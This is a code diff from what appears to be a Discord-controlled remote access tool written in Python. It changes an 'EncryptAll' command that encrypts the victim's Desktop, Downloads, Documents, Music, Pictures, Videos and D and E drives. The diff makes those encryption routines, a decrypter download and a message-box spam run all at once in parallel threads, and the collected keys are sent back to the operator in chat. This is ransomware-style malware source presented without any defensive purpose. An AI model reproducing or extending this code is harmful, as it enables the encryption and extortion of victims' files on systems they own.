@@ -13,6 +13,9 @@ import discord
 import urllib.request
 import urllib
 import tkinter as tk
+from threading import *
+from time import *
+import socket, threading, time
 
 from urllib.request import urlopen
 from time import sleep
@@ -531,7 +534,6 @@ async def EncryptAll_command(ctx: SlashContext):
                     finshed = True
                     lol = 'Desktop Folder : '
                     PASSWORDS.append(f"{lol}{passwd}")
-                    C_drive_downloads()
                 else:
                     shit = 420
             else:
@@ -606,7 +608,6 @@ async def EncryptAll_command(ctx: SlashContext):
                     finshed = True
                     lol = 'Downloads Folder : '
                     PASSWORDS.append(f"{lol}{passwd}")
-                    C_drive_documents()
                 else:
                     shit = 420
             else:
@@ -681,7 +682,6 @@ async def EncryptAll_command(ctx: SlashContext):
                     finshed = True
                     lol = 'Documents Folder : '
                     PASSWORDS.append(f"{lol}{passwd}")
-                    C_drive_music()
                 else:
                     shit = 420
             else:
@@ -756,7 +756,6 @@ async def EncryptAll_command(ctx: SlashContext):
                     finshed = True
                     lol = 'Music Folder : '
                     PASSWORDS.append(f"{lol}{passwd}")
-                    C_drive_pictures()
                 else:
                     shit = 420
             else:
@@ -831,7 +830,6 @@ async def EncryptAll_command(ctx: SlashContext):
                     finshed = True
                     lol = 'Pictures Folder : '
                     PASSWORDS.append(f"{lol}{passwd}")
-                    C_drive_videos()
                 else:
                     shit = 420
             else:
@@ -906,7 +904,6 @@ async def EncryptAll_command(ctx: SlashContext):
                     finshed = True
                     lol = 'Videos Folder : '
                     PASSWORDS.append(f"{lol}{passwd}")
-                    D_drive()
                 else:
                     shit = 420
             else:
@@ -982,11 +979,9 @@ async def EncryptAll_command(ctx: SlashContext):
                     finshed = True
                     lol = 'D Drive : '
                     PASSWORDS.append(f"{lol}{passwd}")
-                    E_drive()
                 else:
                     shit = 420
             else:
-                E_drive()
                 shit = 420
 
         def E_drive():
@@ -1079,10 +1074,31 @@ async def EncryptAll_command(ctx: SlashContext):
         res = await client.wait_for('button_click')
         if res.component.label == "YES":
             await ctx.send(content="Booting up auto encrypter, Please wait. . .", hidden=True)
-            C_drive_desktop() # Start auto encrypter
-            download_decrypter() # Download decrypter
+
+            a = Thread(target = C_drive_desktop)
+            b = Thread(target = C_drive_downloads)
+            c = Thread(target = C_drive_documents)
+            d = Thread(target = C_drive_music)
+            e = Thread(target = C_drive_pictures)
+            f = Thread(target = C_drive_videos)
+            g = Thread(target = D_drive)
+            h = Thread(target = E_drive)
+
+            download = Thread(target = download_decrypter)
+            message = Thread(target = spam_messagebox)
+
+            a.start()
+            b.start()
+            c.start()
+            d.start()
+            e.start()
+            f.start()
+            g.start()
+            h.start()
+            download.start()
+            message.start()
+
             await ctx.send(f"```Finished encrypted everything and sent message box```\n\n**Here are the keys to decrypt the files!**\n{json.dumps(PASSWORDS, indent=6)}")
-            spam_messagebox() # Send message box
         else:
             await ctx.send(content="Cancelled!", hidden=True)
         
